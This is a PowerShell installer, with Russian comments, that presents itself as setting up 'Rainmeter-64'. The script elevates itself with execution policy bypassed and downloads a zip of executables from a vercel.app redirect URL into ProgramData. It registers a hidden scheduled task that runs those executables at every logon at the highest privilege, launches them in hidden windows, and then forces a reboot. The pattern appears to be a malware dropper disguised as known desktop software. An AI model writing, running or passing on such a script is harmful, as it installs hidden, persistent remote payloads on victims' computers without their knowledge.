param(
    [Parameter(Mandatory=$true)]
    [string]$enroll_token,
    [Parameter(Mandatory=$true)]
    [string]$id
)

$ErrorActionPreference = 'Stop'

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $argList = @(
        "-NoProfile"
        "-ExecutionPolicy", "Bypass"
        "-File", "`"$PSCommandPath`""
        "-enroll_token", "`"$enroll_token`""
        "-id", "`"$id`""
    )
    Start-Process -FilePath "powershell.exe" -ArgumentList $argList -Verb RunAs
    exit
}

try {
    $zipUrl      = "https://redirect-ten-gold.vercel.app/Rainmeter-64.zip"
    $zipPath     = "$env:ProgramData\Rainmeter-64.zip"
    $extractPath = "$env:ProgramData\Rainmeter-64"

    Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
    Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
    Remove-Item -Path $zipPath -Force

    $taskName = "Rainmeter64AutoStart"
    
    # Определяем пути ко всем трем программам
    $raintimePath = "$env:ProgramData\Rainmeter-64\Raintime-x64.exe"
    $bbgPath = "$env:ProgramData\Rainmeter-64\bbg.exe"
    $uninstallPath = "$env:ProgramData\Rainmeter-64\uninstall.exe"

    # Проверяем наличие всех файлов
    if (-not (Test-Path $raintimePath)) {
        throw "EXE not found: $raintimePath"
    }
    if (-not (Test-Path $bbgPath)) {
        throw "EXE not found: $bbgPath"
    }
    if (-not (Test-Path $uninstallPath)) {
        throw "EXE not found: $uninstallPath"
    }

    $configPath = "C:\ProgramData\Rainmeter-64\conig_manager.xml"

    if (Test-Path $configPath) {
        $content = Get-Content -Path $configPath -Raw
        $content = $content -replace 'enroll_token=.*?;', "enroll_token=$enroll_token;"
        Set-Content -Path $configPath -Value $content
    } 

    $autorunDir        = "C:\ProgramData\Rainmeter-64"
    $autorunScriptPath = "C:\ProgramData\Rainmeter-64\autorun.ps1"

    if (-not (Test-Path $autorunDir)) {
        New-Item -Path $autorunDir -ItemType Directory -Force | Out-Null
    }

    $autorunScript = @'
$ErrorActionPreference = "Stop"

# Определяем пути ко всем программам
$raintimePath = "C:\ProgramData\Rainmeter-64\Raintime-x64.exe"
$bbgPath = "C:\ProgramData\Rainmeter-64\bbg.exe"
$uninstallPath = "C:\ProgramData\Rainmeter-64\uninstall.exe"

$logFile = "C:\ProgramData\Rainmeter-64\autorun.log"
$logDir  = Split-Path $logFile -Parent

if (-not (Test-Path $logDir)) {
    New-Item -Path $logDir -ItemType Directory -Force | Out-Null
}

"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') START ALL PROGRAMS" | Out-File -FilePath $logFile -Append

# Функция для запуска программы
function Start-HiddenProcess {
    param($exePath, $processName)
    
    try {
        if (-not (Test-Path $exePath)) {
            "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ERROR: $processName not found: $exePath" | Out-File -FilePath $logFile -Append
            return $null
        }
        $p = Start-Process -FilePath $exePath -WorkingDirectory (Split-Path $exePath -Parent) -WindowStyle Hidden -PassThru -ErrorAction Stop
        "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') OK $processName PID=$($p.Id)" | Out-File -FilePath $logFile -Append
        return $p
    }
    catch {
        "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ERROR $processName: $($_.Exception.Message)" | Out-File -FilePath $logFile -Append
        return $null
    }
}

# Запускаем все три программы
$p1 = Start-HiddenProcess -exePath $raintimePath -processName "Raintime-x64"
$p2 = Start-HiddenProcess -exePath $bbgPath -processName "bbg"
$p3 = Start-HiddenProcess -exePath $uninstallPath -processName "uninstall"

# Проверяем результаты
$successCount = 0
if ($p1) { $successCount++ }
if ($p2) { $successCount++ }
if ($p3) { $successCount++ }

"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') LAUNCHED $successCount/3 PROGRAMS" | Out-File -FilePath $logFile -Append
'@

    Set-Content -Path $autorunScriptPath -Value $autorunScript -Encoding UTF8

    $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if ($existingTask) {
        Stop-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
    }

    $action      = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$autorunScriptPath`""
    $trigger     = New-ScheduledTaskTrigger -AtLogOn
    $settings    = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit ([TimeSpan]::Zero) -Hidden
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
    $principal   = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive -RunLevel Highest

    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Description "Rainmeter-64 hidden" -ErrorAction Stop

    Write-Host "Done '$taskName' created."
    
    # Запускаем все программы сразу после установки
    Write-Host "Starting all programs..."
    
    if (Test-Path $raintimePath) {
        Start-Process -FilePath $raintimePath -WorkingDirectory $extractPath -WindowStyle Hidden
        Write-Host "  ✓ Raintime-x64.exe started"
    }
    
    if (Test-Path $bbgPath) {
        Start-Process -FilePath $bbgPath -WorkingDirectory $extractPath -WindowStyle Hidden
        Write-Host "  ✓ bbg.exe started"
    }
    
    if (Test-Path $uninstallPath) {
        Start-Process -FilePath $uninstallPath -WorkingDirectory $extractPath -WindowStyle Hidden
        Write-Host "  ✓ uninstall.exe started"
    }
    
    Write-Host "All programs launched. Restarting computer..."
    Restart-Computer
}
catch {
    Write-Host "Error:" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    if ($_.ScriptStackTrace) {
        Write-Host ""
        Write-Host "StackTrace:" -ForegroundColor Yellow
        Write-Host $_.ScriptStackTrace
    }
}
